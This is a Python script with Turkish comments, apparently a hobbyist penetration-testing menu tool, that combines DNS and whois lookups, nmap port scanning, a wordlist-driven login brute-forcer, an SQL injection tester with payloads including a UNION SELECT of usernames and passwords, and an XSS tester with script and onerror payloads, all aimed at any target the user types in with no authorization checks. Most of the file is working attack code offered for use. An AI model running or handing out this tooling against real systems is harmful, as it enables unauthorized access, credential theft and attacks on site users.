import socket
import threading
import nmap
import requests
import dns.resolver
import whois

class SecurityTool:
    def __init__(self):
        self.target_ip = None
        self.target_domain = None
        self.ascii_art = r"""
         .--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--. 
/ .. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \
\ \/\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ \/ /
 \/ /`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'\/ / 
 / /\                                                                            / /\ 
/ /\ \       ___           ___           ___           ___           ___        / /\ \
\ \/ /      /\__\         /\__\         /\  \         /\  \         /\  \       \ \/ /
 \/ /      /::|  |       /:/ _/_       /::\  \       /::\  \       /::\  \       \/ / 
 / /\     /:/:|  |      /:/ /\__\     /:/\:\__\     /:/\:\  \     /:/\:\__\      / /\ 
/ /\ \   /:/|:|  |__   /:/ /:/ _/_   /:/ /:/  /    /:/  \:\  \   /:/ /:/  /     / /\ \
\ \/ /  /:/ |:| /\__\ /:/_/:/ /\__\ /:/_/:/__/___ /:/__/ \:\__\ /:/_/:/__/___   \ \/ /
 \/ /   \/__|:|/:/  / \:\/:/ /:/  / \:\/:::::/  / \:\  \ /:/  / \:\/:::::/  /    \/ /
 / /\       |:/:/  /   \::/_/:/  /   \::/~~/~~~~   \:\  /:/  /   \::/~~/~~~~     / /\ 
/ /\ \      |::/  /     \:\/:/  /     \:\~~\        \:\/:/  /     \:\~~\        / /\ \
\ \/ /      |:/  /       \::/  /       \:\__\        \::/  /       \:\__\       \ \/ /
 \/ /       |/__/         \/__/         \/__/         \/__/         \/__/        \/ / 
 / /\        ___           ___                                                   / /\ 
/ /\ \      /\  \         /\  \                                                 / /\ \
\ \/ /     /::\  \       /::\  \         ___                                    \ \/ /
 \/ /     /:/\:\  \     /:/\:\  \       /\__\                                    \/ /
 / /\    /:/  \:\  \   /:/  \:\  \     /:/  /                                    / /\ 
/ /\ \  /:/__/ \:\__\ /:/__/ \:\__\   /:/__/                                    / /\ \
\ \/ /  \:\  \ /:/  / \:\  \ /:/  /  /::\  \                                    \ \/ /
 \/ /    \:\  /:/  /   \:\  /:/  /  /:/\:\  \                                    \/ /
 / /\     \:\/:/  /     \:\/:/  /   \/__\:\  \                                   / /\ 
/ /\ \     \::/  /       \::/  /         \:\__\                                 / /\ \
\ \/ /      \/__/         \/__/           \/__/                                 \ \/ /
 \/ /                                                                            \/ / 
 / /\.--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--..--./ /\ 
/ /\ \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \/\ \
\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `"\ `'\ `'\ `'\ `'\ `' /
 `--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`--'`-- 
   .--.       .--.
    _  `    \     /    `  _
     `\.===. \.^./ .===./`
            \/`"`\/
         ,  | y2k |  ,
        / `\|;-.-'|/` \
       /    |::\  |    \
    .-' ,-'`|:::; |`'-, '-.
        |   |::::\|   | 
        |   |::::;|   |
        |   \:::://   |
        |    `.://'   |
       .'             `.
    _,'                 `,_    
        """
    
    def show_ascii_art(self):
        # ASCII sanatını ekrana yazdırıy
        print(self.ascii_art)
        
    # 1. IP Bulma (Domain'den IP almak)
    def get_ip_from_domain(self, domain):
        try:
            ip = socket.gethostbyname(domain)
            print(f"{domain} IP adresi: {ip}")
            return ip
        except socket.gaierror:
            print(f"{domain} için IP alınamadı.")
            return None

    # 2. DNS Lookup
    def dns_lookup(self, domain):
        try:
            resolver = dns.resolver.Resolver()
            answers = resolver.resolve(domain)
            print(f"{domain} DNS kayıtları:")
            for rdata in answers:
                print(f"IP: {rdata.address}")
        except Exception as e:
            print(f"DNS lookup hatası: {e}")

    # 3. Whois Lookup
    def whois_lookup(self, domain):
        try:
            w = whois.whois(domain)
            print(f"{domain} Whois Bilgileri:")
            print(w)
        except Exception as e:
            print(f"Whois sorgusu hatası: {e}")

    def set_target(self, target):
        if target.startswith("http"):
            self.target_domain = target
            self.target_ip = self.get_ip_from_domain(target.split('//')[1])
        else:
            self.target_ip = target
        print(f"Hedef IP: {self.target_ip}")

    # 4. Port Tarama
    def port_scan(self, target_ip, port_range="22-443"):
        print(f"Port taraması başlatılıyor: {target_ip}")
        nm = nmap.PortScanner()
        nm.scan(hosts=target_ip, arguments=f"-p {port_range}")
        for host in nm.all_hosts():
            print(f"Tarama Sonuçları: {host}")
            for protocol in nm[host].all_protocols():
                print(f"Protokol: {protocol}")
                lport = nm[host][protocol].keys()
                for port in lport:
                    print(f"Port: {port} | Durum: {nm[host][protocol][port]['state']}")

    # 5. Brute Force Saldırısı
    def start_brute_force(self, url, username_file=None, password_file=None, usernames=None, passwords=None):
        print("Brute Force saldırısı başlatılıyor...")

        # Eğer dosya yolu verilmişse, dosyaları oku
        if username_file and password_file:
            with open(username_file, 'r') as u_file:
                usernames = u_file.readlines()
            with open(password_file, 'r') as p_file:
                passwords = p_file.readlines()

        # Eğer manuel giriş yapılıyorsa, girilen kullanıcı adı ve şifreleri listeye çevir
        if usernames and passwords:
            usernames = usernames.split(',')
            passwords = passwords.split(',')

        # Brute force saldırısını gerçekleştir
        for username in usernames:
            for password in passwords:
                print(f"Deneme: {username.strip()} - {password.strip()}")
                # Burada gerçek brute force saldırısını yapacak kodu eklemeniz gerekecek
                # Örneğin, HTTP istekleri veya POST verisi gönderme ile login denemeleri
                response = requests.post(url, data={'username': username.strip(), 'password': password.strip()})
                if "başarılı giriş" in response.text:
                    print(f"Başarılı giriş: {username.strip()} - {password.strip()}")
                    return
        print("Brute Force saldırısı tamamlandı.")

    # 6. SQL Injection Testi
    def sql_injection(self, url):
        print("SQL Injection testi başlatılıyor...")

        # Burada SQL Injection için yaygın parametreleri test ediyoruz
        payloads = ["' OR '1'='1", "' OR 'x'='x", "' UNION SELECT NULL, username, password FROM users --"]
        for payload in payloads:
            print(f"Deneme: {payload}")
            response = requests.get(url, params={'id': payload})
            if "veri tabanı hatası" in response.text or "sistemde hata" in response.text:
                print(f"SQL Injection başarılı: {payload}")
                return
        print("SQL Injection testi tamamlandı.")

    # 7. XSS Testi
    def xss_test(self, url):
        print("XSS testi başlatılıyor...")

        # Burada XSS saldırısı için yaygın script payloadlarını test ediyoruz
        payloads = ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(1)">']
        for payload in payloads:
            print(f"Deneme: {payload}")
            response = requests.get(url, params={'input': payload})
            if payload in response.text:
                print(f"XSS saldırısı başarılı: {payload}")
                return
        print("XSS testi tamamlandı.")

    def display_menu(self):
        print("\n----- Güvenlik Araçları -----")
        print("1. Port Taraması")
        print("2. Brute Force Saldırısı")
        print("3. SQL Injection Testi")
        print("4. XSS Testi")
        print("5. DNS Lookup")
        print("6. Whois Lookup")
        print("7. Çıkış")
        choice = input("Seçiminizi yapın: ")
        return choice

    def run(self):
        # Display ASCII Art when the program starts
        self.show_ascii_art()

        while True:
            choice = self.display_menu()
            if choice == "1":
                self.port_scan(self.target_ip)
            elif choice == "2":
                url = input("Brute Force saldırısı için URL girin: ")
                input_method = input("Dosyadan mı yoksa manuel mi giriş yapacaksınız? (dosya/manuel): ")
                if input_method == "dosya":
                    username_file = input("Kullanıcı adı dosyasının yolunu girin: ")
                    password_file = input("Şifre listesi dosyasının yolunu girin: ")
                    self.start_brute_force(url, username_file=username_file, password_file=password_file)
                elif input_method == "manuel":
                    usernames = input("Kullanıcı adlarını virgülle ayırarak girin: ")
                    passwords = input("Şifreleri virgülle ayırarak girin: ")
                    self.start_brute_force(url, usernames=usernames, passwords=passwords)
                else:
                    print("Geçersiz giriş metodu")
            elif choice == "3":
                url = input("SQL Injection testi için URL girin: ")
                self.sql_injection(url)
            elif choice == "4":
                url = input("XSS testi için URL girin: ")
                self.xss_test(url)
            elif choice == "5":
                domain = input("DNS Lookup için domain girin: ")
                self.dns_lookup(domain)
            elif choice == "6":
                domain = input("Whois Lookup için domain girin: ")
                self.whois_lookup(domain)
            elif choice == "7":
                print("Çıkılıyor...")
                break
            else:
                print("Geçersiz seçenek.")

# Programı çalıştırma
if __name__ == "__main__":
    tool = SecurityTool()
    target = input("Hedef IP ya da Domain girin: ")
    tool.set_target(target)
    tool.run()
